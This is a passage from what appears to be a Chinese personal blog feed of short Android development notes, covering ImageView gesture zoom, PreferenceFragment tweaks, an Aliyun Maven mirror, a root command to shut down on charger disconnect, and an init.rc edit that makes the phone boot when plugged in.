&#123;</span><br><span class="line">                <span class="comment">//图片高度大于控件高度，去除顶部边界</span></span><br><span class="line">                translationY = height - bottom;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//图片高度小于控件宽度，移动到中间</span></span><br><span class="line">                translationY = height * <span class="number">1.0f</span> / <span class="number">2f</span> - (top + heightF * <span class="number">1.0f</span> / <span class="number">2f</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mScaleMatrix.postTranslate(translationX, translationY);</span><br><span class="line">        setImageMatrix(mScaleMatrix);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 双击改变大小</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 点击的中心点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y 点击的中心点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">onDoubleDrowScale</span><span class="params">(<span class="keyword">float</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果缩放动画已经在执行，那就不执行任何事件</span></span><br><span class="line">        <span class="keyword">if</span> (mAnimator != <span class="keyword">null</span> &amp;&amp; mAnimator.isRunning())</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">float</span> drowScale = getDoubleDrowScale();</span><br><span class="line">        <span class="comment">//执行动画缩放，不然太难看了</span></span><br><span class="line">        scaleAnimation(drowScale, x, y);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缩放动画</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> drowScale 缩放的比例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 中心点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y 中心点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">scaleAnimation</span><span class="params">(<span class="keyword">final</span> <span class="keyword">float</span> drowScale, <span class="keyword">final</span> <span class="keyword">float</span> x, <span class="keyword">final</span> <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mAnimator != <span class="keyword">null</span> &amp;&amp; mAnimator.isRunning())</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        mAnimator = ObjectAnimator.ofFloat(getScale(), drowScale);</span><br><span class="line">        mAnimator.setDuration(<span class="number">300</span>);</span><br><span class="line">        mAnimator.setInterpolator(<span class="keyword">new</span> AccelerateInterpolator());</span><br><span class="line">        mAnimator.addUpdateListener(<span class="keyword">new</span> ValueAnimator.AnimatorUpdateListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationUpdate</span><span class="params">(ValueAnimator animation)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">float</span> value = ((<span class="keyword">float</span>) animation.getAnimatedValue()) / getScale();</span><br><span class="line">                mScaleMatrix.postScale(value, value, x, y);</span><br><span class="line">                setImageMatrix(mScaleMatrix);</span><br><span class="line">                removeBorderAndTranslationCenter();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        mAnimator.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回双击后改变的大小比例(我们希望缩放误差在deviation范围内)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">float</span> <span class="title">getDoubleDrowScale</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">float</span> deviation = <span class="number">0.05f</span>;</span><br><span class="line">        <span class="keyword">float</span> drowScale = <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">float</span> scale = getScale();</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(mInitScale - scale) &lt; deviation)</span><br><span class="line">            scale = mInitScale;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(mMidScale - scale) &lt; deviation)</span><br><span class="line">            scale = mMidScale;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(mMaxScale - scale) &lt; deviation)</span><br><span class="line">            scale = mMaxScale;</span><br><span class="line">        <span class="keyword">if</span> (scale != mMidScale) &#123;</span><br><span class="line">            <span class="comment">//当前大小不等于mMidScale,则调整到mMidScale</span></span><br><span class="line">            drowScale = mMidScale;</span><br><span class="line">            isEnlarge = scale &lt; mMidScale;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果等于mMidScale，则判断放大或者缩小</span></span><br><span class="line">            <span class="comment">//判断是放大或者缩小，如果上次是放大，则继续放大，缩小则继续缩小</span></span><br><span class="line">            <span class="keyword">if</span> (isEnlarge) &#123;</span><br><span class="line">                <span class="comment">//放大</span></span><br><span class="line">                drowScale = mMaxScale;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//缩小</span></span><br><span class="line">                drowScale = mInitScale;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> drowScale;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取图片宽高以及左右上下边界</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> RectF <span class="title">getMatrixRectF</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Drawable drawable = getDrawable();</span><br><span class="line">        <span class="keyword">if</span> (drawable == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        RectF rectF = <span class="keyword">new</span> RectF(<span class="number">0</span>, <span class="number">0</span>, drawable.getMinimumWidth(), drawable.getMinimumHeight());</span><br><span class="line">        Matrix matrix = getImageMatrix();</span><br><span class="line">        matrix.mapRect(rectF);</span><br><span class="line">        <span class="keyword">return</span> rectF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取当前图片的缩放值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">float</span> <span class="title">getScale</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">float</span>[] values = <span class="keyword">new</span> <span class="keyword">float</span>[<span class="number">9</span>];</span><br><span class="line">        mScaleMatrix.getValues(values);</span><br><span class="line">        <span class="keyword">return</span> values[Matrix.MSCALE_X];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解决和父控件滑动冲突 只要图片边界超过控件边界，返回true</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> direction</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true 禁止父控件滑动</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canScrollHorizontally</span><span class="params">(<span class="keyword">int</span> direction)</span> </span>&#123;</span><br><span class="line">        RectF rect = getMatrixRectF();</span><br><span class="line">        <span class="keyword">if</span> (rect == <span class="keyword">null</span> || rect.isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (direction &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> rect.right &gt;= getWidth() + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rect.left &lt;= <span class="number">0</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 同楼上</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> direction</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canScrollVertically</span><span class="params">(<span class="keyword">int</span> direction)</span> </span>&#123;</span><br><span class="line">        RectF rect = getMatrixRectF();</span><br><span class="line">        <span class="keyword">if</span> (rect == <span class="keyword">null</span> || rect.isEmpty())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (direction &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> rect.bottom &gt;= getHeight() + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rect.top &lt;= <span class="number">0</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>转载自<a href="https://blog.csdn.net/jingzz1/article/details/84663067" target="_blank" rel="noopener">红地毯前吃泡面-android ImageView 手势缩放，双击放大，自由滑动，多点触控，惯性滑动</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>调用小米文件浏览器打开文件夹</title>
      <link href="/2021/diao-yong-xiao-mi-wen-jian-liu-lan-qi-da-kai-wen-jian-jia/"/>
      <url>/2021/diao-yong-xiao-mi-wen-jian-liu-lan-qi-da-kai-wen-jian-jia/</url>
      
        <content type="html"><![CDATA[<p>传入的是文件夹路径  </p><a id="more"></a>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> <span class="constructor">Intent(Intent.ACTION_VIEW)</span>;</span><br><span class="line">intent.set<span class="constructor">ClassName(<span class="string">"com.android.fileexplorer"</span>,<span class="string">"com.android.fileexplorer.activity.FileActivity"</span>)</span>;</span><br><span class="line">intent.set<span class="constructor">Data(Uri.<span class="params">parse</span>(<span class="params">file</span>.<span class="params">getPath</span>()</span>));</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"> start<span class="constructor">Activity(<span class="params">intent</span>)</span>;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"> e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>隐藏PreferenceFragment左边无图标的空白</title>
      <link href="/2021/yin-cang-preferencefragment-zuo-bian-wu-tu-biao-de-kong-bai/"/>
      <url>/2021/yin-cang-preferencefragment-zuo-bian-wu-tu-biao-de-kong-bai/</url>
      
        <content type="html"><![CDATA[<p>最近制作设置界面发现PreferenceFragment左边会有一部分空白  </p><a id="more"></a>  <p>自定义现实抽象类覆盖方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BasePreferenceFragment</span> <span class="keyword">extends</span> <span class="title">PreferenceFragmentCompat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setAllPreferencesToAvoidHavingExtraSpace</span><span class="params">(Preference preference)</span> </span>&#123;</span><br><span class="line">        preference.setIconSpaceReserved(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (preference <span class="keyword">instanceof</span> PreferenceGroup)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;((PreferenceGroup) preference).getPreferenceCount();i++)&#123;</span><br><span class="line">                setAllPreferencesToAvoidHavingExtraSpace(((PreferenceGroup) preference).getPreference(i));</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setPreferenceScreen</span><span class="params">(PreferenceScreen preferenceScreen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preferenceScreen != <span class="keyword">null</span>)</span><br><span class="line">            setAllPreferencesToAvoidHavingExtraSpace(preferenceScreen);</span><br><span class="line">        <span class="keyword">super</span>.setPreferenceScreen(preferenceScreen);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> RecyclerView.<span class="function">Adapter <span class="title">onCreateAdapter</span><span class="params">(PreferenceScreen preferenceScreen)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> PreferenceGroupAdapter(preferenceScreen)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPreferenceHierarchyChange</span><span class="params">(Preference preference)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">null</span>!=preference)&#123;</span><br><span class="line">                    setAllPreferencesToAvoidHavingExtraSpace(preference);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">super</span>.onPreferenceHierarchyChange(preference);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面方法转载自<a href="https://blog.csdn.net/csdn0lan/article/details/88760088" target="_blank" rel="noopener">androidx.preference.PreferenceScreen 去除左边空白 - csdn0lan</a> </p><p>也可以在 <code>Preference</code> 里添加 <code>app:iconSpaceReserved=&quot;false&quot;</code> 解决</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Preference</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:iconSpaceReserved</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:title</span>=<span class="string">"xxx"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:summary</span>=<span class="string">"xxx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在SettingsFragment中自定义储存数据的文件</title>
      <link href="/2021/zai-settingsfragment-zhong-zi-ding-yi-chu-cun-shu-ju-de-wen-jian/"/>
      <url>/2021/zai-settingsfragment-zhong-zi-ding-yi-chu-cun-shu-ju-de-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>在 <code>onCreatePreferences()</code> 方法中使用 <code>getPreferenceManager().setSharedPreferencesName(&quot;set&quot;);</code> 将数据指定保存到 <code>/data/data/&lt;packagename&gt;/shared_prefs/set.xml</code> 文件  </p><a id="more"></a>  <figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">SettingsFragment</span> <span class="keyword">extends</span> <span class="title">PreferenceFragmentCompat</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public void onCreatePreferences(<span class="type">Bundle</span> savedInstanceState, <span class="type">String</span> rootKey) &#123;</span><br><span class="line">        getPreferenceManager().setSharedPreferencesName(<span class="string">"set"</span>);</span><br><span class="line">        setPreferencesFromResource(<span class="type">R</span>.xml.root_preferences, rootKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AS中文输出乱码解决</title>
      <link href="/2021/as-zhong-wen-shu-chu-luan-ma-jie-jue/"/>
      <url>/2021/as-zhong-wen-shu-chu-luan-ma-jie-jue/</url>
      
        <content type="html"><![CDATA[<p>换新版AS后，发现在build output内输出中文乱码  </p><a id="more"></a>  <p>解决：<br>在AS安装目录打开bin文件夹，找到 <code>studio64.exe.vmoptions</code> 文件，打开后在里面添加一行 </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">-Dfile.encoding</span>=UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure><p>保存重启AS即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Activity不可见时自动关闭</title>
      <link href="/2021/activity-bu-ke-jian-shi-zi-dong-guan-bi/"/>
      <url>/2021/activity-bu-ke-jian-shi-zi-dong-guan-bi/</url>
      
        <content type="html"><![CDATA[<p>让Activity启动别的Activity后自动关闭自己，当Activity不可见时自动关闭  </p><a id="more"></a>   <p>两个实现方法</p><ul><li><p>在AndroidManifest.xml中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:noHistory="true"</span><br></pre></td></tr></table></figure></li><li><p>在Activity启动前设置intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>阿里云maven仓库</title>
      <link href="/2021/a-li-yun-maven-cang-ku/"/>
      <url>/2021/a-li-yun-maven-cang-ku/</url>
      
        <content type="html"><![CDATA[<p><a href="https://developer.aliyun.com/mvn/guide" target="_blank" rel="noopener">阿里云Maven</a>  </p><a id="more"></a>  <p>gradle使用  </p><p>build.gradle</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">allprojects</span> &#123;</span><br><span class="line">  <span class="section">repositories</span> &#123;</span><br><span class="line">    <span class="section">maven</span> &#123;</span><br><span class="line">      <span class="attribute">url</span> <span class="string">'https://maven.aliyun.com/repository/public/'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">maven</span> &#123;</span><br><span class="line">    <span class="attribute">url</span> <span class="string">'https://maven.aliyun.com/repository/google'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>显示被隐藏的桌面图标</title>
      <link href="/2021/xian-shi-bei-yin-cang-de-zhuo-mian-tu-biao/"/>
      <url>/2021/xian-shi-bei-yin-cang-de-zhuo-mian-tu-biao/</url>
      
        <content type="html"><![CDATA[<p>Win10不知道从那个版本起默认隐藏了 <code>此电脑</code> 的桌面图标  </p><a id="more"></a>  <p>可以在 <code>设置</code> - <code>个性化</code> - <code>主题</code> - <code>桌面图标设置</code> 里恢复被隐藏的图标</p><p>快捷键 <code>Win</code> + <code>E</code> 直接打开也很方便</p>]]></content>
      
      
      
        <tags>
            
            <tag> Win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓6系统彩蛋</title>
      <link href="/2021/an-zhuo-6-xi-tong-cai-dan/"/>
      <url>/2021/an-zhuo-6-xi-tong-cai-dan/</url>
      
        <content type="html"><![CDATA[<p>安卓6的彩蛋类似FlappyBird游戏，在新版本安卓系统中也一直有保留  </p><a id="more"></a>  <p>这个界面在安卓6之后的系统并没有直接打开的入口，可以通过<a href="https://www.coolapk.com/apk/com.x7890.shortcutcreator" target="_blank" rel="noopener">创建快捷方式</a> 之类的软件创建活动的快捷方式打开，可以用使用shell打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.android.systemui/com.android.systemui.egg.MLandActivity</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓断电关机实现</title>
      <link href="/2021/an-zhuo-duan-dian-guan-ji-shi-xian/"/>
      <url>/2021/an-zhuo-duan-dian-guan-ji-shi-xian/</url>
      
        <content type="html"><![CDATA[<p>前文是实现通电开机，关机状态要开机麻烦点，开机状态执行一些操作就方便了，可以用软件实现断电关机  </p><a id="more"></a>  <p>安卓系统在充电器连接和断开是会发送系统广播，可以利用系统广播接收充电器连接状态，以此实现对应操作</p><p>在AndroidManifest.xml中注册广播接收器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">".PowerReceiver"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.ACTION_POWER_CONNECTED"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.ACTION_POWER_DISCONNECTED"</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>广播接收器内代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PowerReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(intent.getAction().equals(Intent.ACTION_POWER_CONNECTED))&#123;</span><br><span class="line">   <span class="comment">//充电器连接</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(intent.getAction().equals(Intent.ACTION_POWER_DISCONNECTED))&#123;</span><br><span class="line">   <span class="comment">//充电器断开</span></span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在充电器断开是以root方式执行 <code>reboot -p</code> 即可实现关机，使用这个命令关机的缺点是无关机动画，手机会直接黑屏关机</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">powerOff</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">"su -c reboot -p"</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓6.0+通电自动开机</title>
      <link href="/2021/an-zhuo-6-0-tong-dian-zi-dong-kai-ji/"/>
      <url>/2021/an-zhuo-6-0-tong-dian-zi-dong-kai-ji/</url>
      
        <content type="html"><![CDATA[<p>最近准备将手机改成电视盒子试试，为了方便的让手机随电视一起开机，找到了这个方法将手机改为连接充电器自动开机  </p><a id="more"></a>  <h4 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h4><p><a href="https://res.gddhy.net/apk/imagehelper.apk" target="_blank" rel="noopener">镜像助手</a> ：提取boot.img文件使用<br><a href="https://res.gddhy.net/apk/imagefactory.apk" target="_blank" rel="noopener">镜像工厂</a> ：解包和打包boot.img<br><a href="https://www.coolapk.com/apk/bin.mt.plus" target="_blank" rel="noopener">MT管理器</a> ：修改boot内的init.rc文件  </p><p>ps. 手机需要有root权限</p><h4 id="提取boot文件"><a href="#提取boot文件" class="headerlink" title="提取boot文件"></a>提取boot文件</h4><p>使用 <code>镜像助手</code> 提取手机的boot.img文件</p><h4 id="解包boot文件"><a href="#解包boot文件" class="headerlink" title="解包boot文件"></a>解包boot文件</h4><p>使用 <code>镜像工厂</code> 的 <code>解包 BOOT/RECOVERY</code> 功能，选择刚才提取的boot.img文件，使用默认输出目录解包就行</p><h4 id="修改init-rc文件"><a href="#修改init-rc文件" class="headerlink" title="修改init.rc文件"></a>修改init.rc文件</h4><p>使用 <code>MT管理器</code> 找到 <code>/ImageFactory/unpacked/boot.img_unpacked/ramdisk/init.rc</code> 文件，打开  </p><p>搜索关键词 <code>charger</code> ，找到  <code>on charger</code> 这一段代码</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">on</span> <span class="keyword">property</span>:sys.init_log_level=*</span><br><span class="line">    loglevel $&#123;sys.init_log_level&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">on</span> charger</span><br><span class="line">    class_start charger</span><br><span class="line"></span><br><span class="line"><span class="keyword">on</span> <span class="keyword">property</span>:vold.decrypt=trigger_reset_main</span><br><span class="line">    class_reset main</span><br></pre></td></tr></table></figure><p>在 <code>on charger</code> 后添加重启命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">setprop</span> <span class="selector-tag">sys</span><span class="selector-class">.powerctl</span> <span class="selector-tag">reboot</span></span><br></pre></td></tr></table></figure><p>添加后如下</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">on</span> <span class="string">charger</span></span><br><span class="line">    <span class="attr">class_start</span> <span class="string">charger</span></span><br><span class="line">    <span class="attr">setprop</span> <span class="string">sys.powerctl reboot</span></span><br></pre></td></tr></table></figure><p>修改后保存文件</p><h4 id="打包boot"><a href="#打包boot" class="headerlink" title="打包boot"></a>打包boot</h4><p>打开 <code>镜像工厂</code> 的 <code>打包 BOOT/RECOVERY</code> 功能<br>选择已解包目录 使用默认的 <code>boot.img_unpacked</code> 即可，文件名可以使用一会方便寻找的文件名</p><h4 id="刷入boot"><a href="#刷入boot" class="headerlink" title="刷入boot"></a>刷入boot</h4><p>使用 <code>镜像助手</code> 刷入刚才打包的boot.img即可</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>此时可以关机连接充电器测试是否修改成功<br>魔趣9.0系统可以正常连接充电器开机</p><blockquote><p>转载自<a href="https://blog.csdn.net/weixin_40352715/article/details/113097792" target="_blank" rel="noopener">安卓6.0+通电自动开机-一只不会爬的虫子</a> ，本文只简单记录修改方法，图文详细教程可以去原帖查看</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>动态设置VideoView大小</title>
      <link href="/2021/dong-tai-she-zhi-videoview-da-xiao/"/>
      <url>/2021/dong-tai-she-zhi-videoview-da-xiao/</url>
      
